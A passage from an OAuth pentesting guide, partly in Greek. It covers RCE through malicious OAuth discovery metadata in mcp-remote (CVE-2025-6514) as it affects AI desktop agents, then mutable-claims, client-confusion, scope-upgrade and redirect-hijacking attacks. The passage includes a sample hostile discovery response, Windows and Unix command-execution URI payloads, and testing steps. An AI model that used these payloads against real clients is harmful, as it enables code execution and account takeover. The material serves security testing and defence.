Έρευνα για το [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (που επηρεάζει clients όπως Claude Desktop, Cursor ή Windsurf μέσω του `mcp-remote`) δείχνει πώς το dynamic OAuth discovery γίνεται primitive για RCE όποτε ο client προωθεί τα IdP metadata κατευθείαν στο λειτουργικό σύστημα. Ο απομακρυσμένος MCP server επιστρέφει έναν attacker-controlled `authorization_endpoint` κατά τη διάρκεια της discovery ανταλλαγής (`/.well-known/openid-configuration` ή οποιοδήποτε metadata RPC). Το `mcp-remote ≤0.1.15` στη συνέχεια καλούσε τον system URL handler (`start`, `open`, `xdg-open`, κ.λπ.) με οποιοδήποτε string ερχόταν, έτσι οποιοδήποτε scheme/path υποστηρίζεται από το OS εκτελείται τοπικά.

Attack workflow

1. Δείξτε τον desktop agent σε έναν εχθρικό MCP/OAuth server (`npx mcp-remote https://evil`). Ο agent λαμβάνει 401 μαζί με metadata.
2. Ο server απαντά με JSON όπως:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. The client launches the OS handler for the supplied URI. Windows accepts payloads like `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux accept `file:///Applications/Calculator.app/...` or even custom schemes such as `cmd://bash -lc '<payload>'` if registered.
4. Because this happens before any user interaction, **merely configuring the client to talk to the attacker server yields code execution**.

**How to test**

- Target any OAuth-capable desktop/agent that performs discovery over HTTP(S) and opens returned endpoints locally (Electron apps, CLI helpers, thick clients).
- Intercept or host the discovery response and replace `authorization_endpoint`, `device_authorization_endpoint`, or similar fields with `file://`, `cmd://`, UNC paths, or other dangerous schemes.
- Observe whether the client validates the scheme/host. Lack of validation results in immediate execution under the user context and proves the issue.
- Repeat with different schemes to map the full attack surface (e.g., `ms-excel:`, `data:text/html,`, custom protocol handlers) and demonstrate cross-platform reach.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
- Even though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).

## Client Confusion Attack

In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.



## Αναφορές

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
